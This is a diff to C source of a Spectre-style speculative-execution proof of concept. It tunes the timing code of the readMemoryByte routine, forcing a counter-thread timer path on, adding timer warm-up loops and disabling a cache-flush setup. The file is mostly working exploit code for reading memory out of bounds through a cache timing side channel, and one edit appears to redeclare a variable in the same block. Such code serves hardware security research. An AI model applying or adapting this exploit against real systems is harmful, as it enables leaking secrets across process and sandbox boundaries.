@@ -33,13 +33,14 @@
 #endif /* ifdef _MSC_VER */
 #endif /* ifdef WASM */
 
-#ifdef NORDTSC
+// #ifdef NORDTSC
+#ifndef KJFLSKJFLSDKJFSLDKFJSLKDFJSLKDJF
 #include <string.h>
 #include <pthread.h>
 // Does this conflict with stdint?
 #include <unistd.h>
 #include <stdbool.h>
-#define NORDTSCP
+// #define NORDTSCP
 #endif
 
 // #ifdef WASM
@@ -193,6 +194,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
+  register int time3;
   volatile uint8_t * addr;
 
 #ifdef NOCLFLUSH
@@ -296,6 +298,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       Intel and AMD.
       */
 
+      int m;
+      for (m=0;m<50;m++)
+      {
+        time1 = __rdtsc(); /* READ TIMER */
+        time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      }
+
       _mm_mfence();
       time1 = __rdtsc(); /* READ TIMER */
       _mm_mfence();
@@ -310,11 +319,18 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       Luckily, these older processors don't seem to reorder the rdtsc instruction,
       so not having mfence on older processors is less of an issue.
       */
+     
+      int m;
+      for (m=0;m<50;m++)
+      {
+        time1 = __rdtsc(); /* READ TIMER */
+        time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      }
 
       time1 = __rdtsc(); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#endif
+#endif /* ndef NOMFENCE*/
 #else
 #ifndef NOMFENCE
       int m;
@@ -328,8 +344,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       _mm_mfence();
       junk = * addr; /* MEMORY ACCESS TO TIME */
       _mm_mfence();
-      time2 = get_counter();
+      time3 = get_counter();
       _mm_mfence();
+      time2 = time3;
       // printf("time2: %d\n", time2);
 #else
       int m;
@@ -340,11 +357,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       }
       reset_counter();
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = get_counter();
+      time3 = get_counter();
+      time2 = time3;
       // printf("time2: %d\n", time2);
-#endif
-#endif
-#endif
+#endif /* ndef NOMFENCE*/
+#endif /* ndef NORDTSC */
+#endif /* ndef NORDTSCP */
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
       // if(mix_i != array1[tries % array1_size])
@@ -385,7 +403,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 
 int g_argc              = 0;
 const char * * g_argv = NULL;
-#ifdef NORDTSC
+// #ifdef NORDTSC
+#ifndef KJFLSKJFLSDKJFSLDKFJSLKDFJSLKDJF
 int myarray[64*64] = {45};
 int counter = 0;
 pthread_mutex_t lock;
@@ -496,11 +515,11 @@ int main(int argc,
   uint8_t value[2];
   int i;
 
-  #ifdef NOCLFLUSH
-  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
-    cache_flush_array[i] = 45;
-  }
-  #endif
+  // #ifdef NOCLFLUSH
+  // for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
+  //   cache_flush_array[i] = 45;
+  // }
+  // #endif
   
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
